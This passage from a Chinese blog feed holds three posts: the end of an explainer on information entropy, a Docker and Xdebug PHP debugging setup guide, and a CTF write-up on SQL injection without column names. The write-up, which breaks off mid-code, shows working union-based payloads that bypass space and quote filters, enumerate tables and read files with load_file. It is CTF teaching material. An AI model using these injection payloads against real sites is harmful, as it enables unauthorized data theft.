href="#类型三：确定情况" class="headerlink" title="类型三：确定情况"></a>类型三：确定情况</h3><p>听完听力后，你获取了一个消息”衬衫的价格是9磅15便士”，王五英语非常好，从这个消息中王五直接得知<code>&quot;C选项是正确的&quot;</code>，这个信息直接将C选项概率提高到100%(2bits)，直接确定了实际情况。</p><img src="/article/entropy/image-20210412180814429.png" class="" title="C" loading="lazy"><h2 id="信息的接收"><a href="#信息的接收" class="headerlink" title="信息的接收"></a>信息的接收</h2><h3 id="媒介无关"><a href="#媒介无关" class="headerlink" title="媒介无关"></a>媒介无关</h3><p><strong>同一个观察者对同一件事接受到的信息与传递信息的信号模式无关</strong></p><p>王五写纸条给赵六<code>&quot;答案是C&quot;</code>传递的信息是2bits，直接告诉赵六传递的信息也是2bits，打三个响指(与赵六约定好，赵六能够理解)，传递的信息也是2bits</p><h3 id="相对个体"><a href="#相对个体" class="headerlink" title="相对个体"></a>相对个体</h3><p><strong>接收到的信息是相对于观察者已经对该事情的实际了解程度而言的</strong></p><p>王五会这道题，王五对这道题的熵就为0bit，不管王五搞不告诉赵六正确答案是C，因为观察者王五已经拥有这件事的所有信息，即王五确定(知道)这道题的答案是C，不确定性从最初就不存在。</p><p>赵六不会这道题，所以赵六对这道题的熵为2bits，因为观察者赵六没有对于这件事的任何信息。</p><p>对于李四而言，王五告诉张三<code>&quot;答案是C&quot;</code>，提供给李四1.58bits信息，因为观察者李四知道B是错的，观察者拥有关于这件事情的部分信息。</p><p>赵六认为C是错的，再告诉赵六答案是C，熵不会减少，因为没有实际帮助赵六消除事情的不确定性，因为熵不会随着主观臆想而减少，信息也不随主观意识而改变。</p><h3 id="相对事件"><a href="#相对事件" class="headerlink" title="相对事件"></a>相对事件</h3><p><code>&quot;太阳东升西落&quot;</code>，这句话对知道的人提供0bit信息，对知道或东或西升起的人提供了1bit信息，对认为东南西北都可能升起的人提供了2bits信息</p><img src="/article/entropy/image-20210412204545002.png" class="" title="东南西北" loading="lazy"><h2 id="信息量的计算"><a href="#信息量的计算" class="headerlink" title="信息量的计算"></a>信息量的计算</h2><p>信息也是物理量，类似于<code>千克</code>，选种千克为单位物理量，则测量其他物体的质量就是以多少个单位质量，即多少千克来计算。</p><p>信息也是参照单位事件的不确定性，看看待测事件的不确定性相当于”多少个”参照事件的不确定性，其中”多少个”，便是信息量。</p><p>如果选择参照事件像是抛硬币这样50%两种等概率情况的事件时，测量的信息量的单位就称为比特(bit)。</p><p>测量质量是，可以用待测物体质量m除以参照物体质量B，因为待测物体质量m=参照物体质量B 乘 参照物体个数n，所以知道总质量m 求 个数 n 时，利用除法计算即可。</p><p>可是测量信息时却不能用除法，因为抛三枚硬币产生的等可能结果并非 $3*2=6种$，而是 $2^3=8种$</p><p><code>[正正正,正正反,正反正,正反反,反正正,反正反,反反正,反反反]</code></p><p>不是线性关系，而是指数关系，所以当知道可能情况个数m，想求这些情况相当于多少个n参照事件产生的时，就用对数运算即可。</p><p>$$ m = 2^n $$</p><p>$$ n = log_2m $$</p><p>所以对答案ABCD里哪一选项的不确定性即为<br>$$ log_24 = 2 bits $$<br>这种情况因为每个选项都是25%的等概率才可以，与抛硬币一样，出现正反的概率都是相等的50%</p><img src="/article/entropy/image-20210413213110288.png" class="" width="24" loading="lazy"><p>可张三知道有一半可能是C选项时，各个情况的概率就不一样了。这时要分别测量待测事件每种可能的信息量后乘它们各自发生的概率再相加即可。</p><img src="/article/entropy/image-20210413213513800.png" class="" title="log2" loading="lazy"><p>不过我们不知道概率为1/6的情况的不确定性相当于抛多少个硬币所产生的不确定性，m未知就没法用这个公式</p><p>$$ log_2m_A $$</p><p>但1%会发生的情况相当于从100个等概率情况中确定实际情况，而概率的倒数=等概率情况的个数</p><p>$$ p = 1/100 $$<br>$$ 100 = 1/p $$</p><p>用概率的倒数1/p替换等概率情况个数m后就可以计算每种情况的信息量了</p><p>$$ m = 1/p $$</p><img src="/article/entropy/image-20210413214141284.png" class="" title="p1" loading="lazy"><p>再将每个情况的信息量乘对应发生的概率再相加，就能算出总信息量了</p><p>$$ P_A: 1/6 log_2(6/1) = 0.43 bits $$</p><p>$$ P_b:1/6 log_2(6/1) = 0.43 bits $$</p><p>$$ P_c:1/2 log_2(2/1) = 0.5 bits $$</p><p>$$ P_d:1/6 log_2(6/1) = 0.43 bits $$</p><p>张三得知<code>&quot;有一半可能是C选项&quot;</code>后的不确定性(熵)为 $1.79 bits$</p><p>$$ P_a+P_b+P_c+P_d = 1.79 bits $$</p><p>告诉张三<code>&quot;有一半可能是C选项&quot;</code>后提供的信息为 $2-1.79=0.21 bits$</p><h3 id="均匀分布"><a href="#均匀分布" class="headerlink" title="均匀分布"></a>均匀分布</h3><p>$$ log_2m $$</p><h3 id="一般分布"><a href="#一般分布" class="headerlink" title="一般分布"></a>一般分布</h3><p>$$ \sum p_i log_2 p_i^{-1} $$</p><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a href="https://www.zhihu.com/question/22178202">知乎:信息熵是什么？</a></p><p><a href="https://mp.weixin.qq.com/s/toPBIMFPKG0FNzkKu2owfw">微信公众号:超智能体 信息论</a></p><p><a href="https://kns.cnki.net/kcms/detail/detail.aspx?filename=WJFZ202010024&dbcode=CJFQ&dbname=CJFD2020&v=f5iFxWNeOELznrq%25mmd2BGTndyblA9BGrQdi6BASTgoipwWx5vvgdZDVsk9Y0pGb3T8Ra">马猛飞,石乐义,魏东平,徐兴华.基于信息熵的分布式Web服务移动目标防御方案[J].计算机技术与发展,2020,30(10):131-136.</a></p>]]></content>
    
    
    <summary type="html">&lt;p&gt;摸鱼的学习总结，搞作品赛必须的理论学习…&lt;/p&gt;</summary>
    
    
    
    <category term="杂谈笔记" scheme="https://err0r.top/categories/%E6%9D%82%E8%B0%88%E7%AC%94%E8%AE%B0/"/>
    
    <category term="学习笔记" scheme="https://err0r.top/categories/%E6%9D%82%E8%B0%88%E7%AC%94%E8%AE%B0/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    
    
  </entry>
  
  <entry>
    <title>docker-php+mysql配置debug环境</title>
    <link href="https://err0r.top/article/phpstormdebug/"/>
    <id>https://err0r.top/article/phpstormdebug/</id>
    <published>2021-03-31T03:49:39.000Z</published>
    <updated>2021-03-31T12:59:58.885Z</updated>
    
    <content type="html"><![CDATA[<p>记录下之前搭建过程</p><a id="more"></a><h2 id="前置要求："><a href="#前置要求：" class="headerlink" title="前置要求："></a>前置要求：</h2><ol><li>装好phpstorm</li><li>装好docker</li><li>下载docker-compose(可选)</li></ol><p>最后附一键docker-compose搭建方法，可附带mysql，感谢王神指导。</p><h2 id="手动搭建"><a href="#手动搭建" class="headerlink" title="手动搭建"></a>手动搭建</h2><h3 id="docker进行PHP多版本部署"><a href="#docker进行PHP多版本部署" class="headerlink" title="docker进行PHP多版本部署"></a>docker进行PHP多版本部署</h3><p><code>docker run -d -p 10001:80 -v /Users/gyy/dockerPHP/www/html:/var/www/html php:5.6-apache</code><br><code>docker run -d -p 10002:80 -v /Users/gyy/dockerPHP/www/html:/var/www/html php:7.4-apache</code><br><code>docker run -d -p 10003:80 -v /Users/gyy/dockerPHP/www/html:/var/www/html php:7.2-apache</code><br><code>docker run -d -p 10004:80 -v /Users/gyy/dockerPHP/www/html:/var/www/html php:7.3-apache</code><br><code>docker run -d -p 10005:80 -v /Users/gyy/dockerPHP/www/html:/var/www/html php:7.0-apache</code></p><p>随意，要啥版本起啥容器，可以去<a href="https://hub.docker.com/_/php">https://hub.docker.com/_/php</a> 看</p><p>参数解释：</p><pre class="language-none"><code class="language-none">-d ： 后台运行-v ： 目录映射，因为我们要把本地目录映射到容器目录本地目录:容器目录</code></pre><h3 id="安装xdebug模块"><a href="#安装xdebug模块" class="headerlink" title="安装xdebug模块"></a>安装xdebug模块</h3><p>安装vim并换源</p><pre class="language-sh" data-language="sh"><code class="language-sh">echo &#39;deb http:&#x2F;&#x2F;mirrors.aliyun.com&#x2F;debian&#x2F; buster main non-free contrib \deb http:&#x2F;&#x2F;mirrors.aliyun.com&#x2F;debian&#x2F; buster-updates main non-free contrib \ deb http:&#x2F;&#x2F;mirrors.aliyun.com&#x2F;debian&#x2F; buster-backports main non-free contrib \ deb-src http:&#x2F;&#x2F;mirrors.aliyun.com&#x2F;debian&#x2F; buster main non-free contrib \ deb-src http:&#x2F;&#x2F;mirrors.aliyun.com&#x2F;debian&#x2F; buster-updates main non-free contrib \ deb-src http:&#x2F;&#x2F;mirrors.aliyun.com&#x2F;debian&#x2F; buster-backports main non-free contrib \ deb http:&#x2F;&#x2F;mirrors.aliyun.com&#x2F;debian-security&#x2F; buster&#x2F;updates main non-free contrib \ deb-src http:&#x2F;&#x2F;mirrors.aliyun.com&#x2F;debian-security&#x2F; buster&#x2F;updates main non-free contrib&#39;&gt; &#x2F;etc&#x2F;apt&#x2F;sources.list \&amp;&amp; apt update &amp;&amp; apt install -y vim</code></pre><p>安装xdebug模块</p><p><code>docker exec -it &lt;id&gt; bash</code>进入容器后</p><pre class="language-sh" data-language="sh"><code class="language-sh">docker-php-ext-install mysqli \    &amp;&amp; pecl install xdebug \    &amp;&amp; docker-php-ext-enable xdebug</code></pre><p><strong>注意</strong>：php5.6需要指定版本安装xdebug</p><pre class="language-sh" data-language="sh"><code class="language-sh">RUN docker-php-ext-install mysqli \    &amp;&amp; docker-php-ext-install mysql \    &amp;&amp; pecl install xdebug-2.5.0</code></pre><p>运行<code>php -m</code> 发现已经安装好xdebug模块</p><h3 id="修改php-ini"><a href="#修改php-ini" class="headerlink" title="修改php.ini"></a>修改php.ini</h3><pre class="language-sh" data-language="sh"><code class="language-sh">cp &#x2F;usr&#x2F;local&#x2F;etc&#x2F;php&#x2F;php.ini-production &#x2F;usr&#x2F;local&#x2F;etc&#x2F;php&#x2F;php.inivim &#x2F;usr&#x2F;local&#x2F;etc&#x2F;php&#x2F;php.ini</code></pre><p>添加</p><pre class="language-none"><code class="language-none">[XDebug]xdebug.remote_enable&#x3D;Onxdebug.remote_host&#x3D;host.docker.internalxdebug.remote_port&#x3D;9000xdebug.auto_trace&#x3D;Onxdebug.collect_vars&#x3D;Onxdebug.collect_return&#x3D;Onxdebug.collect_params&#x3D;Onxdebug.idekey&#x3D;phpstormxdebug.remote_log&#x3D;&#39;&#x2F;tmp&#x2F;xdebug.log&#39;</code></pre><p>写进去之后重启apache服务 <code>apache2ctl restart</code></p><p>查看phpinfo，访问<a href="http://127.0.0.1:[port]">http://127.0.0.1:[port]</a></p><img src="/article/phpstormdebug/image-20210331131421851.png" class="" title="xdebug" loading="lazy"><hr><h2 id="一键部署"><a href="#一键部署" class="headerlink" title="一键部署"></a>一键部署</h2><p>php多版本+mysql服务</p><p>目录结构</p><pre class="language-none"><code class="language-none">|docker-compose.yml└--5.6 └-Dockerfile└--7.4 └-Dockerfile</code></pre><p>Docker-compose.yml，如果需要起不同或更多的版本，照着修改yml和Dockerfile即可</p><pre class="language-yml" data-language="yml"><code class="language-yml"><span class="token key atrule">version</span><span class="token punctuation">:</span> <span class="token string">'3'</span><span class="token key atrule">services</span><span class="token punctuation">:</span>    <span class="token key atrule">php5.6</span><span class="token punctuation">:</span>                <span class="token comment"># 容器名称, 自行修改</span>        <span class="token key atrule">build</span><span class="token punctuation">:</span> ./5.6/           <span class="token comment"># 构建路径, . 表示会在当前路径下找 Dockerfile 文件</span>        <span class="token comment"># image: php:5.6-apache   # 镜像名称, 如果没有上面的 build, docker-compose 将会尝试从官方仓库 pull 该镜像</span>        <span class="token key atrule">ports</span><span class="token punctuation">:</span>             <span class="token punctuation">-</span> 10001<span class="token punctuation">:</span><span class="token number">80</span>     <span class="token comment"># 映射端口 虚拟机端口:容器内端口</span>        <span class="token key atrule">volumes</span><span class="token punctuation">:</span>             <span class="token punctuation">[</span>/Users/gyy/dockerPHP/www/html<span class="token punctuation">:</span>/var/www/html<span class="token punctuation">]</span>        <span class="token key atrule">links</span><span class="token punctuation">:</span>             <span class="token punctuation">-</span> mysql     <span class="token comment">#连接mysql服务</span>        <span class="token key atrule">stdin_open</span><span class="token punctuation">:</span> <span class="token boolean important">true</span>        <span class="token key atrule">tty</span><span class="token punctuation">:</span> <span class="token boolean important">true</span>        <span class="token key atrule">restart</span><span class="token punctuation">:</span> always <span class="token comment"># 自动重启，一般用于开机自启</span>    <span class="token key atrule">mysql</span><span class="token punctuation">:</span>        <span class="token key atrule">image</span><span class="token punctuation">:</span> mysql/mysql<span class="token punctuation">-</span>server<span class="token punctuation">:</span><span class="token number">5.6</span>        <span class="token key atrule">environment</span><span class="token punctuation">:</span>             <span class="token key atrule">MYSQL_ROOT_PASSWORD</span><span class="token punctuation">:</span> <span class="token string">"&lt;password>"</span> <span class="token comment"># 自设mysql的password</span>        <span class="token key atrule">ports</span><span class="token punctuation">:</span>             <span class="token punctuation">-</span> 3306<span class="token punctuation">:</span><span class="token number">3306</span> <span class="token comment"># 由于映射端口，密码需设强密码，否则请关闭端口映射</span>        <span class="token key atrule">restart</span><span class="token punctuation">:</span> always    <span class="token key atrule">php7.4</span><span class="token punctuation">:</span>                <span class="token comment"># 容器名称, 自行修改</span>        <span class="token key atrule">build</span><span class="token punctuation">:</span> ./7.4/           <span class="token comment"># 构建路径, . 表示会在当前路径下找 Dockerfile 文件</span>        <span class="token comment"># image: php:7.4-apache   # 镜像名称, 如果没有上面的 build, docker-compose 将会尝试从官方仓库 pull 该镜像</span>        <span class="token key atrule">ports</span><span class="token punctuation">:</span>             <span class="token punctuation">-</span> 10002<span class="token punctuation">:</span><span class="token number">80</span>     <span class="token comment"># 映射端口 虚拟机端口:容器内端口</span>        <span class="token key atrule">volumes</span><span class="token punctuation">:</span>             <span class="token punctuation">[</span>/Users/gyy/dockerPHP/www/html<span class="token punctuation">:</span>/var/www/html<span class="token punctuation">]</span>        <span class="token key atrule">links</span><span class="token punctuation">:</span>             <span class="token punctuation">-</span> mysql     <span class="token comment">#连接mysql服务</span>        <span class="token key atrule">stdin_open</span><span class="token punctuation">:</span> <span class="token boolean important">true</span>        <span class="token key atrule">tty</span><span class="token punctuation">:</span> <span class="token boolean important">true</span>        <span class="token key atrule">restart</span><span class="token punctuation">:</span> always</code></pre><p>5.6的Dockerfile</p><pre class="language-dockerfile" data-language="dockerfile"><code class="language-dockerfile">FROM php:5.6-apacheRUN echo &#39;deb http:&#x2F;&#x2F;mirrors.aliyun.com&#x2F;debian&#x2F; buster main non-free contrib \  deb http:&#x2F;&#x2F;mirrors.aliyun.com&#x2F;debian&#x2F; buster-updates main non-free contrib \  deb http:&#x2F;&#x2F;mirrors.aliyun.com&#x2F;debian&#x2F; buster-backports main non-free contrib \  deb-src http:&#x2F;&#x2F;mirrors.aliyun.com&#x2F;debian&#x2F; buster main non-free contrib \  deb-src http:&#x2F;&#x2F;mirrors.aliyun.com&#x2F;debian&#x2F; buster-updates main non-free contrib \  deb-src http:&#x2F;&#x2F;mirrors.aliyun.com&#x2F;debian&#x2F; buster-backports main non-free contrib \  deb http:&#x2F;&#x2F;mirrors.aliyun.com&#x2F;debian-security&#x2F; buster&#x2F;updates main non-free contrib \  deb-src http:&#x2F;&#x2F;mirrors.aliyun.com&#x2F;debian-security&#x2F; buster&#x2F;updates main non-free contrib&#39;&gt; &#x2F;etc&#x2F;apt&#x2F;sources.list \    &amp;&amp; apt update &amp;&amp; apt install -y vimRUN [&quot;&#x2F;bin&#x2F;bash&quot;,&quot;-c&quot;,&quot;echo -e \&quot;xdebug.remote_enable&#x3D;On\nxdebug.remote_host&#x3D;host.docker.internal\nxdebug.remote_port&#x3D;9000\nxdebug.auto_trace&#x3D;On\nxdebug.collect_vars&#x3D;On\nxdebug.collect_return&#x3D;On\nxdebug.collect_params&#x3D;On\nxdebug.idekey&#x3D;phpstorm\nxdebug.remote_log&#x3D;&#39;&#x2F;tmp&#x2F;xdebug.log&#39;\&quot; &gt;&gt; &#x2F;usr&#x2F;local&#x2F;etc&#x2F;php&#x2F;conf.d&#x2F;myconfig.ini&quot;]RUN docker-php-ext-install mysqli \    &amp;&amp; docker-php-ext-install mysql \    &amp;&amp; pecl install xdebug-2.5.0 \ # 指定xdebug版本    &amp;&amp; docker-php-ext-enable xdebugRUN apache2ctl restart</code></pre><p>7.4的dockerfile</p><pre class="language-dockerfile" data-language="dockerfile"><code class="language-dockerfile">FROM php:7.4-apacheRUN echo &#39;deb http:&#x2F;&#x2F;mirrors.aliyun.com&#x2F;debian&#x2F; buster main non-free contrib \  deb http:&#x2F;&#x2F;mirrors.aliyun.com&#x2F;debian&#x2F; buster-updates main non-free contrib \  deb http:&#x2F;&#x2F;mirrors.aliyun.com&#x2F;debian&#x2F; buster-backports main non-free contrib \  deb-src http:&#x2F;&#x2F;mirrors.aliyun.com&#x2F;debian&#x2F; buster main non-free contrib \  deb-src http:&#x2F;&#x2F;mirrors.aliyun.com&#x2F;debian&#x2F; buster-updates main non-free contrib \  deb-src http:&#x2F;&#x2F;mirrors.aliyun.com&#x2F;debian&#x2F; buster-backports main non-free contrib \  deb http:&#x2F;&#x2F;mirrors.aliyun.com&#x2F;debian-security&#x2F; buster&#x2F;updates main non-free contrib \  deb-src http:&#x2F;&#x2F;mirrors.aliyun.com&#x2F;debian-security&#x2F; buster&#x2F;updates main non-free contrib&#39;&gt; &#x2F;etc&#x2F;apt&#x2F;sources.list \    &amp;&amp; apt update &amp;&amp; apt install -y vimRUN [&quot;&#x2F;bin&#x2F;bash&quot;,&quot;-c&quot;,&quot;echo -e \&quot;xdebug.remote_enable&#x3D;On\nxdebug.remote_host&#x3D;host.docker.internal\nxdebug.remote_port&#x3D;9000\nxdebug.auto_trace&#x3D;On\nxdebug.collect_vars&#x3D;On\nxdebug.collect_return&#x3D;On\nxdebug.collect_params&#x3D;On\nxdebug.idekey&#x3D;phpstorm\nxdebug.remote_log&#x3D;&#39;&#x2F;tmp&#x2F;xdebug.log&#39;\&quot; &gt;&gt; &#x2F;usr&#x2F;local&#x2F;etc&#x2F;php&#x2F;conf.d&#x2F;myconfig.ini&quot;]RUN  docker-php-ext-install mysqli \    &amp;&amp; pecl install xdebug-2.9.0 \ # 最好也指定下版本    &amp;&amp; docker-php-ext-enable xdebugRUN apache2ctl restart</code></pre><p>在docker-compose.yml所在目录运行<code>docker-compose up -d</code></p><img src="/article/phpstormdebug/image-20210331160533708.png" class="" title="dockercompose" loading="lazy"><p>如图所示，在映射目录写个phpinfo，用不同端口访问本地可见版本不同，可以非常灵活地调试</p><img src="/article/phpstormdebug/image-20210331160730447.png" class="" title="5.6" loading="lazy"><img src="/article/phpstormdebug/image-20210331160748724.png" class="" title="7.4" loading="lazy"><p>xdebug模块也加载好了</p><hr><h2 id="配置phpstorm"><a href="#配置phpstorm" class="headerlink" title="配置phpstorm"></a>配置phpstorm</h2><p>在本地映射目录下新建项目并打开，点击右上角配置</p><img src="/article/phpstormdebug/image-20210331132235844.png" class="" title="configuration" loading="lazy"><img src="/article/phpstormdebug/image-20210331132633011.png" class="" title="con" loading="lazy"><img src="/article/phpstormdebug/image-20210331132745496.png" class="" title="image-20210331132745496" loading="lazy"><p>打开<code>设置Preferences-&gt;Build,Execution,Deployment-&gt;Deployment</code></p><img src="/article/phpstormdebug/image-20210331133638675.png" class="" title="deployment" loading="lazy"><p>打开<code>Run-&gt;Web Server Debug Validation</code></p><img src="/article/phpstormdebug/F4ECC4D5-59CE-4CA5-8304-9DC190624212.png" class="" title="validation" loading="lazy"><p>Chrome浏览器安装debug插件</p><img src="/article/phpstormdebug/image-20210331133929212.png" class="" title="debug" loading="lazy"><img src="/article/phpstormdebug/image-20210331133947378.png" class="" title="xdebug" loading="lazy"><p>然后就可以惹</p><hr><h2 id="访问测试"><a href="#访问测试" class="headerlink" title="访问测试"></a>访问测试</h2><p>一般来说都是在本地搭建环境，尽量别放有公网vps的服务器上…会被打</p><h3 id="页面测试"><a href="#页面测试" class="headerlink" title="页面测试"></a>页面测试</h3><p>映射目录写phpinfo()，访问对应端口的容器</p><img src="/article/phpstormdebug/image-20210331160730447.png" class="" title="5.6" loading="lazy"><img src="/article/phpstormdebug/image-20210331160748724.png" class="" title="7.4" loading="lazy"><h3 id="mysql测试-一键部署可用"><a href="#mysql测试-一键部署可用" class="headerlink" title="mysql测试(一键部署可用)"></a>mysql测试(一键部署可用)</h3><p>映射目录写<code>mysqltest.php</code></p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token variable">$servername</span> <span class="token operator">=</span> <span class="token double-quoted-string string">"mysql"</span><span class="token punctuation">;</span><span class="token variable">$username</span> <span class="token operator">=</span> <span class="token double-quoted-string string">"root"</span><span class="token punctuation">;</span><span class="token variable">$password</span> <span class="token operator">=</span> <span class="token double-quoted-string string">"&lt;password>"</span><span class="token punctuation">;</span> <span class="token comment">// 自设的mysql密码</span><span class="token variable">$conn</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">mysqli</span><span class="token punctuation">(</span><span class="token variable">$servername</span><span class="token punctuation">,</span> <span class="token variable">$username</span><span class="token punctuation">,</span> <span class="token variable">$password</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$conn</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">connect_error</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"error:"</span> <span class="token punctuation">.</span> <span class="token variable">$conn</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">connect_error</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">echo</span> <span class="token double-quoted-string string">"success"</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span></code></pre><p>访问<code>http://127.0.0.1:[port]/mysqltest.php</code></p><img src="/article/phpstormdebug/image-20210331161909008.png" class="" title="5.6mysql" loading="lazy"><img src="/article/phpstormdebug/image-20210331161926189.png" class="" title="7.4mysql" loading="lazy"><p>测试完毕</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;记录下之前搭建过程&lt;/p&gt;</summary>
    
    
    
    <category term="杂谈笔记" scheme="https://err0r.top/categories/%E6%9D%82%E8%B0%88%E7%AC%94%E8%AE%B0/"/>
    
    <category term="菜鸡教程" scheme="https://err0r.top/categories/%E6%9D%82%E8%B0%88%E7%AC%94%E8%AE%B0/%E8%8F%9C%E9%B8%A1%E6%95%99%E7%A8%8B/"/>
    
    
  </entry>
  
  <entry>
    <title>SQL无列名注入</title>
    <link href="https://err0r.top/article/mardasctf/"/>
    <id>https://err0r.top/article/mardasctf/</id>
    <published>2021-03-29T11:17:53.000Z</published>
    <updated>2021-04-20T08:17:53.000Z</updated>
    
    <content type="html"><![CDATA[<p>sql注入的姿势</p><a id="more"></a><p>以DASCTF三月赛为例，记录下无列名注入。</p><h2 id="无列名查询"><a href="#无列名查询" class="headerlink" title="无列名查询"></a>无列名查询</h2><p>例如join进行无列名注入，现在有张表<code>table</code>如下</p><table><thead><tr><th>id</th><th>username</th><th>password</th><th>question</th><th>token</th></tr></thead><tbody><tr><td>1</td><td>1a</td><td>1b</td><td>1c</td><td>1d</td></tr><tr><td>2</td><td>2a</td><td>2b</td><td>2c</td><td>2d</td></tr><tr><td>3</td><td>3a</td><td>3b</td><td>3c</td><td>3d</td></tr></tbody></table><p>正常<strong>在数据库查询</strong>，表名需带反引号，在php端中<strong>并不需要</strong></p><pre class="language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> <span class="token keyword">table</span><span class="token punctuation">;</span></code></pre><img src="/article/mardasctf/image-20210329195606802.png" class="" title="table" loading="lazy"><p>假设不知道列名，通过union查询，需猜测列数，这里为5列</p><pre class="language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">select</span> <span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">5</span> <span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> <span class="token keyword">table</span><span class="token punctuation">;</span></code></pre><img src="/article/mardasctf/image-20210329195833956.png" class="" title="union" loading="lazy"><p>如图所示，列名被替换成了数字，</p><table><thead><tr><th>1（派生表列1）</th><th>2（派生表列2）</th><th>3（派生表列3）</th><th>4（派生表列4）</th><th>5（派生表列5）</th></tr></thead><tbody><tr><td>1（原id）</td><td>2（原username）</td><td>3（原password）</td><td>4（原question）</td><td>5（原token）</td></tr><tr><td>1</td><td>1a</td><td>1b</td><td>1c</td><td>1d</td></tr><tr><td>2</td><td>2a</td><td>2b</td><td>2c</td><td>2d</td></tr><tr><td>3</td><td>3a</td><td>3b</td><td>3c</td><td>3d</td></tr></tbody></table><p>我们可以进一步用数字来对应列查询</p><pre class="language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">select</span> <span class="token punctuation">`</span><span class="token number">2</span><span class="token punctuation">`</span> <span class="token keyword">from</span> <span class="token punctuation">(</span><span class="token keyword">select</span> <span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">5</span> <span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> <span class="token keyword">table</span><span class="token punctuation">)</span>a<span class="token punctuation">;</span></code></pre><img src="/article/mardasctf/image-20210329200819627.png" class="" title="union2" loading="lazy"><p>如果反引号被过滤，同样继续用别名代替</p><pre class="language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">select</span> c <span class="token keyword">from</span> <span class="token punctuation">(</span><span class="token keyword">select</span> <span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span> <span class="token keyword">as</span> b<span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">4</span> <span class="token keyword">as</span> c<span class="token punctuation">,</span><span class="token number">5</span> <span class="token keyword">as</span> d <span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> <span class="token keyword">table</span><span class="token punctuation">)</span>a<span class="token punctuation">;</span></code></pre><img src="/article/mardasctf/image-20210329201418814.png" class="" title="别名" loading="lazy"><p>此时派生表如下</p><table><thead><tr><th>1（派生表列1）</th><th>b（原派生表列2）</th><th>3（派生表列3）</th><th>c（原派生表列4）</th><th>d（派生表列5）</th></tr></thead><tbody><tr><td>1（原id）</td><td>2（原username）</td><td>3（原password）</td><td>4（原question）</td><td>5（原token）</td></tr><tr><td>1</td><td>1a</td><td>1b</td><td>1c</td><td>1d</td></tr><tr><td>2</td><td>2a</td><td>2b</td><td>2c</td><td>2d</td></tr><tr><td>3</td><td>3a</td><td>3b</td><td>3c</td><td>3d</td></tr></tbody></table><p>同时查询多个列</p><pre class="language-none"><code class="language-none">select concat(b,0x2d,c) from (select 1,2 as b,3 as c,4,5 union select * from &#96;table&#96;)a;</code></pre><p><code>0x2d</code>为<code>-</code></p><img src="/article/mardasctf/image-20210329202408382.png" class="" title="concat" loading="lazy"><hr><p>以下是比赛WP</p><h3 id="DASCTF三月赛·bestDB"><a href="#DASCTF三月赛·bestDB" class="headerlink" title="DASCTF三月赛·bestDB"></a>DASCTF三月赛·bestDB</h3><blockquote><p>由于电脑崩了:(  bp和网页都没了，只能凭我写了</p></blockquote><p>进去一个查询框，题目名字有db，肯定是注入了。</p><p>注释中发现hint</p><pre class="language-html" data-language="html"><code class="language-html">&lt;!-- SELECT * FROM users WHERE id = '$query' OR username = \"$query\" --!></code></pre><p>这就建个数据库测试，经测试发现ban了空格和单引号，测试出了payload</p><p><code>-1&quot;union/**/select/**/1,2,3&quot;</code></p><img src="/article/mardasctf/image-20210329193545757.png" class="" title="union" loading="lazy"><p>回显位为1和2，改改以前的脚本，查数据库名</p><pre class="language-sql" data-language="sql"><code class="language-sql"><span class="token operator">-</span><span class="token number">1</span><span class="token string">"union/**/select/**/1,database(),3"</span><span class="token comment"># databases==========>users</span></code></pre><p>查表名</p><pre class="language-sql" data-language="sql"><code class="language-sql"><span class="token operator">-</span><span class="token number">1</span><span class="token string">"union/**/select/**/1,(select/**/group_concat(table_name)/**/from/**/information_schema.tables/**/where/**/table_schema/**/like/**/database()),3"</span><span class="token comment"># tables==========>f1agdas,users</span></code></pre><p>无列名查询(其实直接查就好，本人复习一下之前的知识)</p><pre class="language-sql" data-language="sql"><code class="language-sql"><span class="token operator">-</span><span class="token number">1</span><span class="token string">"union/**/select/**/1,(select/**/`2`/**/from/**/(select/**/1,2/**/union/**/select/**/*/**/from/**/f1agdas/**/limit/**/1,1)a),3"</span><span class="token comment"># data==========>flag.txt</span></code></pre><hr><p>查到<code>f1agdas</code>表里有个<code>flag.txt</code>，应该是利用<code>load_file()</code>函数读取文件，查了下用户</p><pre class="language-sql" data-language="sql"><code class="language-sql"><span class="token operator">-</span><span class="token number">1</span><span class="token string">"union/**/select/**/1,user(),3"</span><span class="token comment"># user==========>'root'@'localhost'</span></code></pre><p>肯定有权限了，读了<code>index.php</code>和<code>dbConnect.php</code>，给复现的师傅参考</p><pre class="language-php" data-language="php"><code class="language-php">// index.php<span class="token php language-php"><span class="token delimiter important">&lt;?php</span>    <span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">include</span> <span class="token single-quoted-string string">'dbConnect.php'</span><span class="token punctuation">;</span>    <span class="token variable">$query</span> <span class="token operator">=</span> <span class="token 